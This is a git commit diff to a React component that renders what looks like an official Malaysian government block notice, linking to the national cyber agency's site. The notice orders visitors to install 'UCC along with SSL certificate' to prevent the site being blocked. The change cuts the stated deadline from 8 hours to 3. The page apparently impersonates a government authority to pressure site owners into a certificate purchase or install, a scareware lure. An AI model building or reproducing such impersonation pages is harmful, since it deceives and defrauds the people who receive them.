456ce6ba648b29f8e5ee104254e1af1616fad6a0
Amrish <amrish@Amrishs-MBP.lan>
2024-03-25 16:10:17 +0530

    3hrs-adddddd

--- src/Block.js
+++ src/Block.js
@@ -9,7 +9,7 @@ function block() {
       <div className="notify">NOTIFICATION</div>
       <div className="note">This website is not available in Malaysia as it violate(s) the National Law(s).</div>
       <div className="note1">Untuk maklumat tanjut / for more information <span className="link"><a href="https://www.nacsa.gov.my/legal.php">Click here</a></span>.</div>
-      <div className="error"><span className="action">Action required:</span> Please install UCC along with SSL certificate within 8 hours to prevent web blockage. This website contains multiple pages and it requires certificates for each pages. </div>
+      <div className="error"><span className="action">Action required:</span> Please install UCC along with SSL certificate within 3 hours to prevent web blockage. This website contains multiple pages and it requires certificates for each pages. </div>
     </div>
     </>
   )
